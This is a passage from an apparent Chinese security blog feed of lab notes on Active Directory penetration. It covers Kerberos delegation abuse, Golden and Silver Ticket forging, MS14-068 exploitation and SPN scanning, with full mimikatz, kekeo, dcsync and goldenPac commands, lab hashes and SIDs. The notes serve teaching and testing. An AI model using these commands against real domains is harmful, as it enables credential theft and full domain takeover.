id="约束委派">约束委派</span></h4><p>由于非约束委派的不安全性，微软在windows2003中发布了约束委派的功能。约束委派在Kerberos中User不会直接发送TGT给服务，而是对发送给service1的认证信息做了限制，不允许service1代表User使用这个TGT去访问其他服务。这里包括一组名为S4U2Self（Service for User to Self）和S4U2Proxy（Service forUser to Proxy）的Kerberos协议扩展。</p><p>从下图可以看到整个过程其实可以分为两个部分，第一个是S4U2Self的过程（流程1-4），第二个是S4U2Proxy的过程（流程5-10）。</p><p><img src="https://image.3001.net/images/20190315/1552650016_5c8b8f20208e8.png" alt="img"></p><p><strong>流程：</strong></p><blockquote><ol><li><p>用户向Service1发送请求。</p></li><li><p>这时在官方文档中的介绍是在这一流程开始之前Service1已经通过KRB_AS_REQ得到了用户用来访问Service1的TGT，然后通过S4U2self扩展模拟用户向KDC请求ST。</p></li><li><p>KDC这时返回给Service1一个用于用户验证Service1的ST（我们称为ST1），并且Service1用这个ST1完成和用户的验证过程。</p></li><li><p>Service1在步骤3使用模拟用户申请的ST1完成与用户的验证，然后响应用户。</p></li></ol><p>注：这个过程中其实Service1是获得了用户的TGT和ST1的，但是S4U2Self扩展不允许Service1代表用户去请求其他的服务。</p><ol><li>用户再次向Service1发起请求，此时Service1需要以用户的身份访问Service2。这里官方文档提到了两个点：</li></ol><p>A.Service1已经验证通过，并且有一个有效的TGT。</p><p>B.Service1有从用户到Service1的forwardableST（可转发ST）。个人认为这里的forwardable ST其实也就是ST1。</p><ol><li><p>Service1代表用户向Service2请求一个用于认证Service2的ST（我们称为ST2）。用户在ST1中通过cname（client name）和crealm（client realm）字段标识。</p></li><li><p>KDC在接收到步骤6中Service1的请求之后，会验证PAC（特权属性证书，在第一篇中有说明）的数字签名。如果验证成功或者这个请求没有PAC（不能验证失败），KDC将返回ST2给Service1，不过这个ST2中cname和crealm标识的是用户而不是Service1。</p></li><li><p>Service1代表用户使用ST2请求Service2。Service2判断这个请求来自已经通过KDC验证的用户。</p></li><li><p>Service2响应Service1的请求。</p></li><li><p>Service1响应用户的请求。</p></li></ol></blockquote><p>在这个过程中，S4U2Self扩展的作用是让Service1代表用户向KDC验证用户的合法性，并且得到一个可转发的ST1。S4U2Proxy的作用可以说是让Service1代表用户身份通过ST1重新获取ST2，并且不允许Service1以用户的身份去访问其他服务。更多的细节可以参考官方的文档，和RFC4120的内容。</p><p>同时注意forwardable字段，有forwardable标记为可转发的是能够通过S4U2Proxy扩展协议进行转发的，如果没有标记则不能进行转发。</p><p><strong>约束委派的配置：</strong></p><p>可以在账户属性中将SRV-DB-ODAY的委派方式更改为约束委派</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566741406966.png" alt="1566741406966"></p><h3><span id="发现域中的委派主机或账户">发现域中的委派主机或账户</span></h3><p>在域中，可以通过PowerView脚本来搜索开启了委派的主机和用户。查询非约束委派主要是通过搜索userAccountControl属性包含ADS_UF_TRUSTED_FOR_DELEGATION的主机或账户。而约束委派则通过查询userAccountControl属性包含TRUSTED_TO_AUTH_FOR_DELEGATION的主机或用户。</p><h4><span id="非约束委派">非约束委派</span></h4><p>通过<code>Import-Module PowerView.ps1</code>加载PowerView脚本之后使用下面的命令进行查询。</p><p>查询域中配置非约束委派的账户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetUser -Unconstrained -Domain rootkit.org</span><br></pre></td></tr></table></figure><p>查询域中配置非约束委派的主机：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetComputer -Unconstrained -Domain rootkit.org</span><br></pre></td></tr></table></figure><h4><span id="约束委派">约束委派</span></h4><p>查询域中配置约束委派的账户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -TrustedToAuth -Domain rootkit.org</span><br></pre></td></tr></table></figure><p>查询域中配置约束委派的主机:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer -TrustedToAuth -Domain rootkit.org</span><br></pre></td></tr></table></figure><h3><span id="委派攻击利用">委派攻击利用</span></h3><h4><span id="非约束委派的利用">非约束委派的利用</span></h4><p>假设已经获取了一个已经配置了委派的账户权限或者是密码，现在我们通过这些条件来攻击其他账户。</p><p>在域中只有服务账户才能有委派功能，所以先把用户sqladmin设置为服务账号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A variant/golden sqladmin</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566919031159.png" alt="1566919031159"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -l sqladmin</span><br></pre></td></tr></table></figure><p>查看配置成功。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566919063736.png" alt="1566919063736"></p><p>然后在“AD用户和计算机”中将sqladmin设置为非约束委派模式</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566919256739.png" alt="1566919256739"></p><p>在域控上使用<code>Administrator</code>访问<code>sqladmin</code>所在主机<code>Srv-Web-Kit</code>的SMB服务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\Srv-Web-Kit.rootkit.org\c$</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566921302149.png" alt="1566921302149"></p><p>在Srv-Web-Kit上通过mimikatz可以导出Administrator发送过来的TGT内容。这里需要使用管理员权限打开mimikatz，然后通过privilege::debug命令提升权限，如果没有提升权限会报kuhl_m_sekurlsa_acquireLSA错误。再使用sekurlsa::tickets/export命令导出内存中所有的票据。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566921630936.png" alt="1566921630936"></p><p>访问域控失败</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566921730332.png" alt="1566921730332"></p><p>通过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt [0;a17510]-2-0-60a10000-Administrator@krbtgt-ROOTKIT.ORG.kirbi</span><br></pre></td></tr></table></figure><p>命令将TGT内容导入到当前会话中。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566921999832.png" alt="1566921999832"></p><p>导入之后已经可以访问域控的共享目录。也就是说每当存在用户访问tsvc的服务时，tsvc的服务就会将访问者的TGT保存在内存中，可以通过这个TGT访问这个TGT所属用户的所有服务。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566922095168.png" alt="1566922095168"></p><h4><span id="约束委派的利用">约束委派的利用</span></h4><p>假设已知配置了约束委派的账号，并且已知当前配置了约束委派的当前账户的密码。</p><ol><li>确认账号sqladmin设置了约束委派。</li></ol><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566959744980.png" alt="1566959744980"></p><ol><li>使用kekeo对域控发起申请TGT的请求。</li></ol><p>通过已知的账户名和明文密码对KDC发起请求，得到TGT。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:sqladmin /domain:rootkit.org /password:Admin12345 /ticket:sqladmin.kirbi</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566960698566.png" alt="1566960698566"></p><blockquote><p>/user:当前用户名</p><p>/domain:所在域名</p><p>/password:当前用户名的密码</p><p>/ticket:生成票据名称。</p></blockquote><ol><li><p>使用kekeo申请TGS票据</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566961060838.png" alt="1566961060838"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:TGT_sqladmin@ROOTKIT.ORG_krbtgt~rootkit.org@ROOTKIT.ORG.kirbi /user:administrator@rootkit.org /service:cifs/owa2013.rootkit.org</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>/tgt:上一步通过kekeo生成的tgt票据</p><p>/user:想要伪造的用户名写全称（用户名@域名）</p><p>/service:想要伪造访问的服务名（服务名/主机的FQDN名称)</p></blockquote><ol><li>使用mimikatz将生成的TGS文件导入到Kerberos凭据列表中</li></ol><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566961661084.png" alt="1566961661084"></p><p>这时可以看到导入之后已经能够成功访问域控的共享文件（严格来说应该是非约束委派中设置的SPN的权限）。而且在这个过程中是不需要管理员权限的，只是用当前账户的权限就可以完成，因为不需要从内存中导出票据。</p><p>非约束委派去获得所设置的SPN的权限主要是三个步骤</p><blockquote><p>1、请求TGT</p><p>2、请求TGS</p><p>3、将TGS导入内存</p></blockquote><p>第1步，使用Kekeo发起AS-REQ请求去请求TGT。这时sqladmin获取到了一个TGT，并且kekeo工具将其保存为一个kirbi格式的文件。</p><p>第2步，再使用这个TGT申请两个ST文件，上文中说到过在约束委派实现的过程中分为两个部分，分别是S4U2Self扩展和S4U2Proxy扩展。S4U2Self中Service1会代替用户向KDC申请一张用于访问自身的TGS，这个TGS也就是生成的两个TGS中的一个（TGS_administrator@rootkit.org@ROOTKIT.ORG_sqladmin@ROOTKIT.ORG.kirbi）还有一个TGS是用于访问非受限委派中设置的SPN的TGS（TGS_administrator@rootkit.org@ROOTKIT.ORG_cifs~owa2013.rootkit.org@ROOTKIT.ORG.kirbi）。</p><p>关于约束委派的这种攻击方式就是通过在Service1（sqladmin）中将自己伪造成用户，然后获取允许约束委派的SPN的TGS的一个过程。</p><h3><span id="委派攻击的防御">委派攻击的防御</span></h3><p>通过上文中说到设置了非约束委派的账户权限如果被窃取那么攻击者可能获取非常多其他账户的TGT，所以最好是不要在域中使用非约束委派这种功能。</p><p>域中不需要使用委派的账户特别是administrator账户，设置为“敏感用户不能被委派”。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566964360982.png" alt="1566964360982"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;委派&quot;&gt;委派&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;在域中如果出现A使用Kerberos身份验证访问域中的服务B，而B再利用A的身份去请求域中的服务C，这个过程就可以理解为委派。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://image.3001.net/i
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>域渗透-Ticket</title>
    <link href="https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Ticket.html"/>
    <id>https://uknowsec.cn/posts/notes/域渗透-Ticket.html</id>
    <published>2019-08-24T14:17:17.000Z</published>
    <updated>2019-08-24T14:56:50.167Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="goldenticket">GoldenTicket</span></h3><h4><span id="简介">简介</span></h4><p>Golden Ticket（下面称为金票）是通过伪造的TGT（TicketGranting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限。</p><p><strong>制作金票的条件：</strong></p><blockquote><p>1、域名称</p><p>2、域的SID值</p><p>3、域的KRBTGT账户密码HASH</p><p>4、伪造用户名，可以是任意的</p></blockquote><h4><span id="利用过程">利用过程</span></h4><p>金票的生成需要用到krbtgt的密码HASH值，可以通过mimikatz中的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /OWA2010SP3.0day.org /user:krbtgt</span><br></pre></td></tr></table></figure><p>命令获取krbtgt的值。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566542295163.png" alt="1566542295163"></p><p>得到KRBTGT HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi，即为伪造成功的TGT。</p><p>参数说明：</p><blockquote><p>/admin：伪造的用户名</p><p>/domain：域名称</p><p>/sid：SID值，注意是去掉最后一个-后面的值</p><p>/krbtgt：krbtgt的HASH值</p><p>/ticket：生成的票据名称</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /krbtgt:36f9d9e6d98ecf8307baf4f46ef842a2 /ticket:golden.kiribi</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566543225966.png" alt="1566543225966"></p><p>通过mimikatz中的kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">kerberos::ppt golden.kiribi</span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566542805439.png" alt="1566542805439"></p><p>此时就可以通过dir成功访问域控的共享文件夹。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\OWA2010SP3.0day.org\c$</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566543260644.png" alt="1566543260644"></p><h3><span id="silvertickets">SilverTickets</span></h3><h4><span id="简介">简介</span></h4><p>Silver Tickets（下面称银票）就是伪造的ST（Service Ticket），因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值），所以银票只能访问指定服务。</p><p><strong>制作银票的条件：</strong></p><blockquote><p>1.域名称</p><p>2.域的SID值</p><p>3.域的服务账户的密码HASH（不是krbtgt，是域控）</p><p>4.伪造的用户名，可以是任意用户名，这里是silver</p></blockquote><h4><span id="利用过程">利用过程</span></h4><p>首先我们需要知道服务账户的密码HASH，这里同样拿域控来举例，通过mimikatz查看当前域账号administrator的HASH值。注意，这里使用的不是Administrator账号的HASH，而是OWA2010SP3$的HASH</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566649973247.png" alt="1566649973247"></p><p>这时得到了OWA2010SP3$的HASH值，通过mimikatz生成银票。</p><p>参数说明：</p><blockquote><p>/domain：当前域名称</p><p>/sid：SID值，和金票一样取前面一部分</p><p>/target：目标主机，这里是OWA2010SP3.0day.org</p><p>/service：服务名称，这里需要访问共享文件，所以是cifs</p><p>/rc4：目标主机的HASH值</p><p>/user：伪造的用户名</p><p>/ptt：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用/ticket导出之后再使用kerberos::ptt来导入</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /target:OWA2010SP3.0day.org /service:cifs /rc4:125445ed1d553393cce9585e64e3fa07 /user:silver /ptt</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566654188946.png" alt="1566654188946"></p><p>这时通过klist查看当前会话的kerberos票据可以看到生成的票据。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566654225879.png" alt="1566654225879"></p><p>使用<code>dir \\OWA2010SP3.0day.org\c$</code>访问DC的共享文件夹。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566654265383.png" alt="1566654265383"></p><h3><span id="enhancedgolden-tickets">EnhancedGolden Tickets</span></h3><p>在Golden Ticket部分说明可利用krbtgt的密码HASH值生成金票，从而能够获取域控权限同时能够访问域内其他主机的任何服务。但是普通的金票不能够跨域使用，也就是说金票的权限被限制在当前域内。</p><h4><span id="域树与域林">域树与域林</span></h4><p>在下图中 UKNOWSEC.CN 为其他两个域的根域，NEWS.UKNOWSEC.CN和 DEV.UKNOWSEC.CN 均为 UKNOWSEC.CN的子域，这三个域组成了一个域树。子域的概念可以理解为一个集团在不同业务上分公司，他们有业务重合的点并且都属于 UKNOWSEC.CN这个根域，但又独立运作。同样 TEST.COM 也是一个单独的域树，两个域树 UKONWSE.CN 和 TEST.CN 组合起来被称为一个域林。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566656866798.png" alt="1566656866798"></p><h4><span id="普通金票的局限性">普通金票的局限性</span></h4><p>在上图中说到UKNOWSEC.CN为其他两个域（NEWS.UKNOWSEC.CN和DEV.UKNOWSEC.CN）的根域，根域和其他域的最大的区别就是根域对整个域林都有控制权。而域正是根据Enterprise Admins组来实现这样的权限划分。</p><p><strong>Enterprise Admins组</strong></p><p>EnterpriseAdmins组是域中用户的一个组，只存在于一个林中的根域中，这个组的成员，这里也就是UKNOWSEC.CN中的Administrator用户（不是本地的Administrator，是域中的Administrator）对域有完全管理控制权。</p><p>UKNOWSEC.CN的域控上Enterprise Admins组的RID为519.</p><p><strong>Domain Admins组</strong></p><p>子域中是不存在EnterpriseAdmins组的，在一个子域中权限最高的组就是Domain Admins组。NEWS.UKNOWSEC.CN这个子域中的Administrator用户，这个Administrator有当前域的最高权限。</p><h4><span id="突破限制">突破限制</span></h4><p>普通的黄金票据被限制在当前域内，在2015年Black Hat USA中国外的研究者提出了突破域限制的增强版的黄金票据。通过域内主机在迁移时LDAP库中的SIDHistory属性中保存的上一个域的SID值制作可以跨域的金票。</p><p>如果知道根域的SID那么就可以通过子域的KRBTGT的HASH值，使用mimikatz创建具有 EnterpriseAdmins组权限（域林中的最高权限）的票据。</p><p>然后通过mimikatz重新生成包含根域SID的新的金票</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:news.uknowsec.cn /sid:XXX /sids:XXX /krbtgt:XXX /startoffset:0 /endin:600 /renewmax:10080 /ptt</span><br></pre></td></tr></table></figure><p>Startoffset和endin分别代表偏移量和长度，renewmax表示生成的票据的最长时间。</p><p>注意这里是不知道根域UKONWSEC.CN的krbtgt的密码HASH的，使用的是子域NEWS.UKNOWSEC.CN中的KRBTGT的密码HASH。</p><p>然后就可以通过dir访问DC. UKNOWSEC的共享文件夹，此时的这个票据票是拥有整个域林的控制权的。</p><h3><span id="reference">Reference</span></h3><p><a href="https://www.freebuf.com/articles/system/197160.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/197160.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;goldenticket&quot;&gt;GoldenTicket&lt;/span&gt;&lt;/h3&gt;&lt;h4&gt;&lt;span id=&quot;简介&quot;&gt;简介&lt;/span&gt;&lt;/h4&gt;&lt;p&gt;Golden Ticket（下面称为金票）是通过伪造的TGT（TicketGranting Ticket）
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>域渗透-MS14-068</title>
    <link href="https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068.html"/>
    <id>https://uknowsec.cn/posts/notes/域渗透-MS14-068.html</id>
    <published>2019-08-22T14:17:17.000Z</published>
    <updated>2019-08-24T14:56:21.307Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="ms14-068">MS14-068</span></h3><p>MS14068是一个能够使普通用户提权到域控权限的权限提升漏洞。攻击者可以通过构造特定的请求包来达到提升权限的目的。</p><h4><span id="利用方式">利用方式</span></h4><p>攻击流程：</p><p>MS14-068对应的补丁为KB3011780，可在域控上通过systeminfo查看是否安装此补丁。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566485511263.png" alt="1566485511263"></p><p>一、在域内主机jerry上通过dir来访问域控的共享文件夹，示拒绝访问。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\OWA2010SP3.0day.org\c$</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566485577139.png" alt="1566485577139"></p><p>二、通过Pykek工具利用漏洞，我这里使用的是将python脚本编译之后的exe文件。</p><p>参数说明：</p><blockquote><p>-u 域账号+@+域名称，这里是jerry+@+rootkit.org</p><p>-p 为当前用户的密码，即jerry的密码</p><p>-s为jerry的SID值，可以通过whoami/all来获取用户的SID值</p><p>-d为当前域的域控</p></blockquote><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566485661082.png" alt="1566485661082"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u sqladmin@0day.org -p admin!@#45 -s S-1-5-21-1812960810-2335050734-3517558805-1142 -d OWA2010SP3.0day.org</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566485702304.png" alt="1566485702304"></p><p>脚本执行成功会在当前目录下生成一个ccache文件。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566485729199.png" alt="1566485729199"></p><p>三、使用mimikatz导入生成的ccache文件，导入之前cmd下使用命令klist purge或者在mimikatz中使用kerberos::purge删除当前缓存的kerberos票据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist purge</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566485815936.png" alt="1566485815936"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc TGT_sqladmin@0day.org.ccache</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566485894244.png" alt="1566485894244"></p><p>再次dir访问域控共享就可以成功访问。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\OWA2010SP3.0day.org\c$</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566485986373.png" alt="1566485986373"></p><h4><span id="goldenpacexe">goldenPac.exe</span></h4><p>impacket工具包里面的goldenPac.py，这个工具是结合ms14-068加psexec的产物，利用起来十分顺手。</p><p>这里用到的是编译的exe文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goldenPac.exe 0day.org/sqladmin:admin!@#45@OWA2010SP3.0day.org</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566486417839.png" alt="1566486417839"></p><p>当然此工具不止是得到一个shell，我们甚至可以直接让该域控运行我们上传的程序。</p><p>这个漏洞中主要的问题是存在于KDC会根据客户端指定PAC中数字签名的加密算法，以及PAC的加密算法，来校验PAC的合法性。这使得攻击者可通过伪造PAC，修改PAC中的SID，导致KDC判断攻击者为高权限用户，从而导致权限提升漏洞的产生。</p><h3><span id="reference">Reference</span></h3><p><a href="https://www.freebuf.com/articles/system/197160.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/197160.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;ms14-068&quot;&gt;MS14-068&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;MS14068是一个能够使普通用户提权到域控权限的权限提升漏洞。攻击者可以通过构造特定的请求包来达到提升权限的目的。&lt;/p&gt;
&lt;h4&gt;&lt;span id=&quot;利用方式&quot;&gt;利用方式&lt;/span
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>域渗透-SPN</title>
    <link href="https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-SPN.html"/>
    <id>https://uknowsec.cn/posts/notes/域渗透-SPN.html</id>
    <published>2019-08-21T14:17:17.000Z</published>
    <updated>2019-08-24T14:55:42.374Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="spn-简介">SPN 简介</span></h3><p>服务主体名称（SPN：ServicePrincipal Names）是服务实例（可以理解为一个服务，比如 HTTP、MSSQL）的唯一标识符。Kerberos 身份验证使用 SPN 将服务实例与服务登录帐户相关联。如果在整个林或域中的计算机上安装多个服务实例，则每个实例都必须具有自己的 SPN。如果客户端可能使用多个名称进行身份验证，则给定服务实例可以具有多个 SPN。SPN 始终包含运行服务实例的主机的名称，因此服务实例可以为其主机的每个名称或别名注册 SPN。</p><p>如果用一句话来说明的话就是如果想使用 Kerberos 协议来认证服务，那么必须正确配置 SPN。</p><h3><span id="spn-格式与配置">SPN 格式与配置</span></h3><p>在 SPN 的语法中存在四种元素，两个必须元素和两个额外元素，其中<service class="">和<host>为必须元素：</host></service></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;serviceclass&gt;/&lt;host&gt;:&lt;port&gt;/&lt;service name&gt;</span><br><span class="line"></span><br><span class="line">&lt;service class&gt;：标识服务类的字符串</span><br><span class="line"></span><br><span class="line">&lt;host&gt;：服务所在主机名称</span><br><span class="line"></span><br><span class="line">&lt;port&gt;：服务端口</span><br><span class="line"></span><br><span class="line">&lt;service name&gt;：服务名称</span><br></pre></td></tr></table></figure><p>例：</p><p>为 SQL Server 服务帐户注册SPN</p><p>手动注册：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -A MSSQLSvc/myhost.redmond.microsoft.com:1433 accountname</span><br></pre></td></tr></table></figure><p>对应的命名实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -A MSSQLSvc/myhost.redmond.microsoft.com/instancename accountname</span><br></pre></td></tr></table></figure><p>如果我想把域中一台主机Srv-DB-0day中的 MSSQL 服务注册到 SPN 中则可以使用命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -A MSSQLSvc/Srv-DB-0day.Oday.org:1433 sqladmin</span><br></pre></td></tr></table></figure><p>可以通过下面两个命令来查看已经注册的 SPN。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setspn -q */* </span><br><span class="line">setspn -T 0day.org -q */*</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566305048964.png" alt="1566305048964"></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566305093686.png" alt="1566305093686"></p><h3><span id="spn扫描">SPN扫描</span></h3><p>在了解了 Kerberos 和 SPN 之后，可以通过 SPN 来获取想要的信息，比如想知道域内哪些主机安装了什么服务，就不需要再进行批量的网络端口扫描。在一个大型域中通常会有不止一个的服务注册 SPN，所以可以通过「SPN 扫描」的方式来查看域内的服务。相对于通常的网络端口扫描的优点是不用直接和服务主机建立连接，且隐蔽性更高。</p><h4><span id="扫描工具">扫描工具</span></h4><h5><span id="getuserspns">GetUserSPNs</span></h5><p>GetUserSPNs 是 Kerberoast 工具集中的一个 powershell 脚本，用来查询域内注册的 SPN。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-module .\GetUserSPNs.ps1</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566310253643.png" alt="1566310253643"></p><h5><span id="powerview">PowerView</span></h5><p>PowerView 是由 Will Schroeder（<a href="https://twitter.com/harmj0y" target="_blank" rel="noopener">https://twitter.com/harmj0y</a>）开发的 Powershell 脚本，在 Powersploit 和 Empire 工具里都有集成，PowerView 相对于上面几种是根据不同用户的 objectsid 来返回，返回的信息更加详细。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-module .\powerview.ps1</span><br><span class="line">Get-NetUser -SPN</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566311054973.png" alt="1566311054973"></p><h4><span id="原理说明"><strong>原理说明</strong></span></h4><p>在 SPN 扫描时可以直接通过脚本，或者命令去获悉内网已经注册的 SPN 内容。那如果想了解这个过程是如何实现的，就需要提到 LDAP 协议。</p><p>LDAP 协议全称是 LightweightDirectory Access Protocol，一般翻译成轻量目录访问协议。是一种用来查询与更新 Active Directory 的目录服务通信协议。AD 域服务利用 LDAP 命名路径（LDAP naming path）来表示对象在 AD 内的位置，以便用它来访问 AD 内的对象。</p><p>LDAP 数据的组织方式：</p><p><img 